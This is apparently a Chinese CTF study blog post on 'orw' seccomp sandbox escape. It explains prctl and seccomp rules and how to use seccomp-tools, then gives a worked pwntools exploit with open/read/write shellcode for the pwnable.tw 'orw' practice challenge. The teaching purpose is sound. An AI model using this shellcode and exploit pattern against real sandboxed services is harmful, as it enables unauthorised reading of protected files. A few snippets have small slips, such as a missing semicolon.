---

title: orw总结

date: 2025-11-06 19:39:56

tags: pwn

categories : ctf学习

comment : true

---

### 介绍

  

orw即沙箱逃逸，现在有很多程序在运行时禁用了系统函数，均采用了沙箱技术开启了沙箱保护，execve函数不能使用，也即system函数无法使用，我们不能正常的get shell，只能用ROP链来调用其他的函数，例如open，read，write来把flag打印出来。这就是orw沙箱逃逸技术的由来。


### 沙箱

  

沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp是内核中的一种安全机制，seccomp可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp规则的设置，可以使用prctl函数和seccomp函数族。

  

### 查看沙箱

  

在实战中我们可以通过 `seccomp-tools`来查看程序是否启用了沙箱, `seccomp-tools`工具安装方法如下:

  

```bash

$ sudo apt install gcc ruby-dev

$ gem install seccomp-tools

```

  

安装完成后通过 `seccomp-tools dump ./pwn`即可查看沙箱函数

  

### 沙箱函数

最原始的沙箱规则是用`prctl()`函数规定的，这个函数规定了程序哪些函数在程序里不能被调用，所以以后遇见了这种函数，那大概率是开了沙箱。

```cpp

int prctl ( int option,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )

  
  

```

**在prctl的五个参数中，其中第一个参数是你要做的事情，后面的参数都是对第一个参数的限定。**

  

在第一个参数中，我们需要重点关注的参数有这两个：

  

(1).PR\_SET\_SECCOMP(22)：当第一个参数是PR\_SET\_SECCOMP,第二个参数argv2为1的时候，表示允许的系统调用有read，write，exit和sigereturn；当argv等于2的时候，表示允许的系统调用由argv3指向sock\_fprog结构体定义，该结构体成员指向的sock\_filter可以定义过滤任意系统调用和系统调用参数。(细节见下图)

  

(2).PR\_SET\_NO\_NEWPRIVS(38):**prctl(38,1,0,0,0)表示禁用系统调用execve()函数**，同时，这个选项可以通过fork()函数和clone()函数继承给子进程。

  
  

## 题型归纳

  

### shellcode 绕过

  

#### 原理

  

最简单的orw，没有开启NX保护的时候，可以让程序执行自己输入的指令直接调用orw三个系统调用

  

以x86下的shellocde为例，x64只需要修改一下寄存器即可

  

```

#fd = open('/home/orw/flag',0)

s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''

  

#read(fd,0x804a094,0x20)

s = ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''

  

#write(1,0x804a094,0x20)

s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''

  

```

  

#### 例题：[pwnable.tw orw](https://pwnable.tw/challenge/#2)

  

检查文件

  

```bash

gef➤  checksec

[+] checksec for '/home/kaf/pwn-practice/pwnable/orw/orw'

Canary                        : ✓

NX                            : ✘

PIE                           : ✘

Fortify                       : ✘

RelRO                         : Partial

```

  

32位程序，没有开启pie、没有开启NX，

  

利用seccomp-tools工具进行扫描

  

```bash

 seccomp-tools dump ./orw

 line  CODE  JT   JF      K

=================================

 0000: 0x20 0x00 0x00 0x00000004  A = arch

 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011

 0002: 0x20 0x00 0x00 0x00000000  A = sys_number

 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011

 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011

 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011

 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011

 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011

 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011

 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011

 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)

 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW

```
可以发现，只有rt\_signreturn,exit\_group,exit,open,read,write这几个系统调用是可以被调用的。
直接写入orw的三个系统调用的shellcode即可
由于栈地址也是固定的，直接在shellocde后面写入flag字符串

```

from pwn import *

  

r = remote("chall.pwnable.tw",10001)

context.log_level = 'debug'

elf = ELF('./orw')

  

bss = elf.bss

#fd = open('/home/orw/flag',0)

s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''

  

#read(fd,0x804a094,0x20)

s += ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''

  

#write(1,0x804a094,0x20)

s += ''' mov edx,0x40; mov ebx,1; mov eax,4; int 0x80; '''

r.recvuntil('shellcode:')

payload = asm(s) + b'/home/orw/flag\x00'

  

r.sendline(payload)

print(r.recv())

r.interactive()

```
### 参考
[pwn-orw总结](https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/)